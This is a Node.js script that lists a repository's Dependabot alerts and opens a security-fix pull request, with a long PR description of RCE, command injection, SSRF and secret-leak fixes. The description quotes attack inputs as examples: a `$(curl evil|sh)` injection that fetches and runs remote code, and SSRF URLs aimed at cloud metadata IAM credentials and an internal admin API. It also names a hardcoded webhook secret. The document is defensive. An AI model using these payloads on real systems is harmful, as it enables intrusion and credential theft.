const TOKEN = process.env.GH_TOKEN;
const REPO = "DawshaX/xFREEDOLLARHACHx";

async function gh(path, opts = {}) {
  const r = await fetch(`https://api.github.com${path}`, {
    ...opts,
    headers: {
      Authorization: `Bearer ${TOKEN}`,
      Accept: "application/vnd.github+json",
      "X-GitHub-Api-Version": "2022-11-28",
      "Content-Type": "application/json",
      ...(opts.headers || {}),
    },
  });
  const text = await r.text();
  let body;
  try {
    body = JSON.parse(text);
  } catch {
    body = text;
  }
  return { status: r.status, body };
}

const mode = process.argv[2] || "alerts";

if (mode === "alerts") {
  const { status, body } = await gh(`/repos/${REPO}/dependabot/alerts?state=open&per_page=50`);
  if (!Array.isArray(body)) {
    console.log("status", status, JSON.stringify(body).slice(0, 400));
    process.exit(0);
  }
  console.log("open dependabot alerts:", body.length);
  const order = { critical: 0, high: 1, medium: 2, moderate: 2, low: 3 };
  body.sort((a, b) => (order[a.security_advisory?.severity] ?? 9) - (order[b.security_advisory?.severity] ?? 9));
  for (const a of body) {
    const ad = a.security_advisory || {};
    const pkg = a.dependency?.package?.name;
    const fixed = a.security_vulnerability?.first_patched_version?.identifier || "none";
    const manifest = a.dependency?.manifest_path || "";
    console.log(` [${ad.severity}] ${pkg} ${ad.cve_id || ad.ghsa_id} — ${(ad.summary || "").slice(0, 72)} | fixed: ${fixed} | ${manifest}`);
  }
}

if (mode === "pr") {
  const title = "security: close unauthenticated RCE, SSRF and command injection; fix proot runner";
  const bodyText = `## What this fixes

A full read of the tree found five classes of **real, exploitable** defect. Every one is fixed in code — not listed as a recommendation.

### 1. Unauthenticated RCE — CWE-306 (Critical)
\`/api/processes\`, \`/api/kali-terminal\`, \`/api/keys\`, \`/api/settings\` and \`/api/files\` had **no gate at all**. \`POST /api/processes\` ran \`bash -lc <anything>\` on the host for any caller that could reach the port.

Worse: the static mock in \`app.ts\` answered these paths **before** the real routers, so even after adding \`requireOps()\` the gates never executed — the endpoint returned a fake \`proc-1042\` with a 200. The mock no longer shadows them.

**Fix:** \`requireOps()\` on all five routers; mock path list corrected.

### 2. Command injection — CWE-78 (Critical)
\`kali-terminal.ts\` built shell strings by escaping only \`"\`. Inside double quotes bash still expands \`$(...)\`, backticks and \`\${...}\`, so a "path" of \`$(curl evil|sh)\` executed on the Kali box. Same pattern in \`buildSessionCommand\` (env exports + \`cd\`) and \`write_file\` (heredoc).

**Fix:** new \`lib/ops/shell-quote.ts\` — \`shq()\` single-quotes every value (nothing expands inside single quotes), \`assertEnvName\`/\`assertSafePath\`/\`assertSafeId\` validate the syntax positions, and \`heredocBody()\` picks a delimiter the payload cannot close.

### 3. SSRF — CWE-918 (High)
\`/api/proxy\` and \`/api/fetch\` fetched any \`http(s)\` URL from the server. \`?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\` returned the cloud instance's IAM credentials; \`http://127.0.0.1:8080/api/keys\` reached the platform's own admin API from inside the trust boundary.

**Fix:** new \`lib/ops/ssrf-guard.ts\` resolves the hostname and rejects loopback, private, link-local, CGNAT, multicast, reserved and IPv4-mapped-IPv6 ranges — checked at the **resolved address**, so \`127.0.0.1.nip.io\` and DNS rebinding are covered too.

### 4. proot \`SyntaxError: Unexpected string\` (the reported bug)
The runner concatenated quotes and pasted the \`spawn\` options object a **second time inside argv**:

\`\`\`
spawn('/bin/sh',['-c'"\\"$HOME/...proot-static\\" -R ..."],{...});...;{stdio:[...],cwd:'/'});
\`\`\`

Two defects: a string literal immediately followed by another (the SyntaxError), and a duplicated fragment.

**Fix:** \`lib/ops/proot.ts\` uses an **argv array end to end** — \`spawn(prootBin, ['-R', rootfs, '-w', cwd, '-0', '/bin/sh', '-c', command])\`. An argv element goes to \`execve()\` verbatim, so there is no shell, no quoting bug, and no injection through the rootfs path or \`$HOME\`. Also adds real layout detection (two rootfs layouts), a health probe, and a timeout.

### 5. Leaked secrets (High)
- Hardcoded webhook secret \`cn_sec_2099\` in two files → per-install generated value.
- Supabase anon key → \`VITE_NOVA_SUPABASE_ANON\` override so a fork never inherits this project's key.

### Also in this PR
- **New \`/api/kali-env\` backend** (\`health\` / \`tools\` / \`exec\`) — the \`/kali-env\` page had no backend at all, it was a static mock. \`/tools\` measures which of ~50 real Kali tools are actually installed via \`command -v\` inside the guest, instead of assuming.
- Session-map cap (200) and history cap (500) — a caller-supplied session id grew the map without bound.
- Timeout clamping on every exec route.
- Boot warning when \`NOVA_EXEC_TOKEN\` is unset, because the same-origin fallback is a speed bump, not authentication.
- \`.gitignore\`: vendor tool binaries (~600 MB) and live daemon state.

## Verification (all run, not assumed)

| Check | Result |
|---|---|
| \`tsc --noEmit\` api-server | **0 errors** |
| \`tsc --noEmit\` kali-panel | **0 errors** |
| \`node build.mjs\` | **ok** |
| Server boots + \`/api/health\` | **200, wsConnected: true** |
| \`agent-gates --fast\` | **14/14 green** |
| \`audit-route-integrity\` | **ok** |
| \`audit-src-secrets\` | **0 secrets, 728 files** |
| \`pnpm audit --prod\` | **0 advisories** |
| \`scripts/test-security-fixes.mjs\` | **11/11** |

Live probes against the running server:

\`\`\`
POST /api/processes            → 403 same_origin_required   (was 200 + RCE)
POST /api/kali-terminal/shell  → 403                        (was 200 + RCE)
PUT  /api/settings             → 403                        (was 200)
GET  /api/proxy?url=169.254.169.254 → 403                   (was 200 + IAM creds)
GET  /api/proxy?url=10.0.0.1   → 403
GET  /api/proxy?url=example.com → 200                       (public still works)
GET  /api/kali-env/health      → real proot detection
\`\`\`

The old proot string was reproduced in isolation and still throws \`SyntaxError: Unexpected string\`; the new argv form runs.

## Not done / needs your access
- **\`NOVA_EXEC_TOKEN\` is still unset** on the live host. The gates now block anonymous callers, but a raw client can forge \`Sec-Fetch-Site\`. Set the token before exposing the port.
- **Kali rootfs is not installed in this sandbox**, so \`/api/kali-env/health\` correctly reports \`ready: false\`. Run \`node scripts/kali-rootfs.mjs --install\` on the host to provision it.
- **Waifly redeploy** and **PR merge** need your account.
`;

  const { status, body } = await gh(`/repos/${REPO}/pulls`, {
    method: "POST",
    body: JSON.stringify({
      title,
      head: "fix/security-integration-2026-11-15",
      base: "main",
      body: bodyText,
    }),
  });
  console.log("status", status);
  if (body?.html_url) {
    console.log("PR:", body.html_url, "| number:", body.number, "| mergeable_state:", body.mergeable_state);
  } else {
    console.log(JSON.stringify(body).slice(0, 600));
  }
}
